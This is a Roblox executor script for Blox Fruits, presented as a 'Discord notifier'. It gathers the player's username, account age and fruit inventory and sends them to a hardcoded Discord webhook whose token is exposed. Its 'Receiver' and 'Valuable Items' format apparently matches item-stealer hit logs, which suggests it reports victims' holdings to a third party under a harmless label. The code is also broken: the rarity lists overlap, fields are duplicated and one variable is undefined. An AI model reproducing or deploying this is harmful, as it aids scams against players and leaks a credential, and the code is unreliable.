-- Blox Fruits Advanced Discord Notifier (Final Robust Version)

-- Ensure we are in the correct environment
if not game or not game.Players then
    error("Roblox environment not detected. Check your executor.")
end

local WEBHOOK_URL = "https://discord.com/api/webhooks/1552377913238622251/kKXh-i41RJs4J51N233PIYqtirpPRZNhH42mQeljxWuLOzSMV8A0jAEgcEd6HJ3zWsms"
local PLAYER = game.Players.LocalPlayer
local PLAYER_NAME = PLAYER.Name

-- 1. Helper: Get Account Age
local function getAccountAge()
    local created = PLAYER.Created
    local now = os.time()
    local seconds = now - os.time(created)
    local days = math.floor(seconds / 86400)
    local hours = math.floor((seconds % 86400) / 3600)
    local minutes = math.floor((seconds % 3600) / 60)
    
    if days > 0 then
        return days .. " days"
    elseif hours > 0 then
        return hours .. " hours"
    else
        return minutes .. " minutes"
    end
end

-- 2. Helper: Get Sea Level
local function getSeaLevel()
    local char = PLAYER.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then
        return "Unknown"
    end
    local pos = char.HumanoidRootPart.Position
    local z = pos.Z
    
    -- Approximate Sea Level Boundaries in Blox Fruits
    if z < 0 then
        return "1"
    elseif z < 2000 then
        return "2"
    else
        return "3"
    end
end

-- 3. Helper: Determine Rarity
local function getRarity(tool)
    -- 1. Check Attributes first
    local rarityAttrs = {"Rarity", "FruitRarity", "Tier", "Type", "RarityType"}
    for _, attrName in ipairs(rarityAttrs) do
        local attrVal = tool:GetAttribute(attrName)
        if attrVal and attrVal ~= "" then
            return tostring(attrVal)
        end
    end
    
    -- 2. Fallback: Heuristic based on common fruit names
    local fruitName = tool.Name:lower()
    
    -- Mythical
    local mythicals = {"dough", "dragon", "venom", "blizzard", "t-rex", "portal", "control", "leviathan", "spirit", "dark", "yeti", "mammoth", "pernida", "robin", "raider", "shark", "bombardier"}
    -- Legendary
    local legendaries = {"magma", "ghost", "diamond", "ice", "flame", "smoke", "blade", "light", "quake", "rubber", "spin", "spider", "sound", "sand", "gravity", "buddha", "phoenix", "lion", "bird"}
    -- Rare
    local rares = {"ghost", "magma", "ice", "flame", "smoke", "blade", "light", "quake", "rubber", "spin", "spider", "sound", "sand", "gravity", "buddha", "phoenix", "lion", "bird"}
    -- Uncommon
    local uncommons = {"smoke", "blade", "light", "quake", "rubber", "spin", "spider", "sound", "sand", "gravity", "buddha", "phoenix", "lion", "bird"}
    -- Common
    local commons = {"smoke", "blade", "light", "quake", "rubber", "spin", "spider", "sound", "sand", "gravity", "buddha", "phoenix", "lion", "bird"}
    
    if table.find(mythicals, fruitName) then return "Mythical" end
    if table.find(legendaries, fruitName) then return "Legendary" end
    if table.find(rares, fruitName) then return "Rare" end
    if table.find(uncommons, fruitName) then return "Uncommon" end
    if table.find(commons, fruitName) then return "Common" end
    
    return "Unknown"
end

-- 4. Helper: Get Stored Fruits
local function getStoredFruits()
    local fruits = {}
    local seen = {}
    
    local function processTool(tool)
        if seen[tool.Name] then return end
        seen[tool.Name] = true
        
        local rarity = getRarity(tool)
        local quantity = 1
        local qtyAttrs = {"Quantity", "Count", "Amount"}
        for _, attrName in ipairs(qtyAttrs) do
            local attrVal = tool:GetAttribute(attrName)
            if attrVal and type(attrVal) == "number" then
                quantity = attrVal
                break
            end
        end
        
        table.insert(fruits, {
            name = tool.Name,
            rarity = rarity,
            quantity = quantity
        })
    end
    
    -- Scan Backpack
    if PLAYER.Backpack then
        for _, tool in pairs(PLAYER.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                processTool(tool)
            end
        end
    end
    
    -- Scan Character
    if PLAYER.Character then
        for _, tool in pairs(PLAYER.Character:GetChildren()) do
            if tool:IsA("Tool") then
                processTool(tool)
            end
        end
    end
    
    -- Sort: Mythical > Legendary > Rare > Uncommon > Common > Unknown, then by Name
    local rarityOrder = {
        ["Mythical"] = 1,
        ["Legendary"] = 2,
        ["Rare"] = 3,
        ["Uncommon"] = 4,
        ["Common"] = 5,
        ["Unknown"] = 6
    }
    
    table.sort(fruits, function(a, b)
        local orderA = rarityOrder[a.rarity] or 7
        local orderB = rarityOrder[b.rarity] or 7
        if orderA ~= orderB then
            return orderA < orderB
        end
        return a.name < b.name
    end)
    
    return fruits
end

-- 5. Build Message Content
local function buildContent()
    local accountAge = getAccountAge()
    local seaLevel = getSeaLevel()
    local fruits = getStoredFruits()
    
    local lines = {}
    
    -- Header
    table.insert(lines, "👤 Display Name : " .. PLAYER_NAME)
    table.insert(lines, "🆔 Username     : " .. PLAYER_NAME)
    table.insert(lines, "📅 Account Age  : " .. accountAge)
    table.insert(lines, "🌊 Sea          : " .. seaLevel)
    table.insert(lines, "😎 Receiver     : host-" .. PLAYER_NAME)
    table.insert(lines, "")
    table.insert(lines, "💰 Valuable Items")
    
    -- Fruits
    if #fruits > 0 then
        for _, fruit in ipairs(fruits) do
            table.insert(lines, "🍎 [" .. fruit.rarity .. "] " .. fruit.name .. " - " .. fruit.quantity .. "x")
        end
    else
        table.insert(lines, "🍎 No fruits found.")
    end
    
    return table.concat(lines, "\n")
end

-- 6. Robust HTTP Sender
local function sendToDiscord()
    local content = buildContent()
    
    local payload = {
        username = "BF Notifier",
        avatar_url = "https://bloxfruits.fandom.com/wiki/Blox_Fruits?action=raw&file=Blox_Fruits_Logo.png",
        content = content
    }
    
    local httpService = game:GetService("HttpService")
    local encodedPayload = httpService:JSONEncode(payload)

    -- Determine which HTTP function to use
    local httpFunc = nil
    if type(request) == "function" then
        httpFunc = request
    elseif type(http_request) == "function" then
        httpFunc = http_request
    elseif type(http) == "function" then
        httpFunc = http
    else
        print("[BF Script] ❌ No HTTP function found in executor. Supported: request, http_request, http")
        return false
    end

    -- Perform the request
    local success, response = pcall(function()
        return httpFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = encodedPayload
        })
    end)

    if success and response and response.Success then
        print("[BF Script] ✅ Successfully sent formatted status to Discord.")
        return true
    else
        print("[BF Script] ❌ Failed to send to Discord.")
        if not success then
            print("PCall Error: " .. tostring(response))
        else
            print("Response Status: " .. tostring(response.StatusCode))
            print("Response Body: " .. tostring(response.Body))
        end
        return false
    end
end

-- 7. HUD Display
local function displayHUD()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BF_AdvancedHUD"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = game:GetService("CoreGui")

    local frame = Instance.new("Frame")
    frame.Name = "MainFrame"
    frame.Size = UDim2.fromOffset(350, 80)
    frame.Position = UDim2.fromScale(0.5, 0.05)
    frame.AnchorPoint = Vector2.new(0.5, 0)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    frame.BorderSizePixel = 0
    frame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 100, 255)
    stroke.Thickness = 2
    stroke.Parent = frame

    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, -10, 0, 25)
    title.Position = UDim2.new(0, 5, 0, 5)
    title.BackgroundTransparency = 1
    title.Text = "📊 Status Sent to Discord"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamMedium
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = frame

    local status = Instance.new("TextLabel")
    status.Name = "Status"
    status.Size = UDim2.new(1, -10, 0, 25)
    status.Position = UDim2.new(0, 5, 0, 35)
    status.BackgroundTransparency = 1
    status.Text = "User: " .. PLAYER_NAME .. "\nFormatted message sent."
    status.TextColor3 = Color3.fromRGB(150, 255, 150)
    status.TextScaled = true
    status.Font = Enum.Font.Gotham
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.TextYAlignment = Enum.TextYAlignment.Top
    status.Parent = frame

    local closeBtn = Instance.new("TextButton")
    closeBtn.Name = "CloseBtn"
    closeBtn.Size = UDim2.fromOffset(35, 35)
    closeBtn.Position = UDim2.fromScale(1, 0.5)
    closeBtn.AnchorPoint = Vector2.new(1, 0.5)
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.BorderSizePixel = 0
    closeBtn.Parent = frame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btn.Parent = closeBtn

    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
end

-- 8. Execute
print("=== Blox Fruits Advanced Notifier ===")
print("Scanning inventory and server info...")

-- Wait to ensure inventory is loaded
task.wait(2)

local sendSuccess = sendToDiscord()

if sendSuccess then
    print("✅ Status sent to Discord successfully.")
else
    print("❌ Failed to send to Discord. Check console for details.")
end

-- Show HUD
displayHUD()
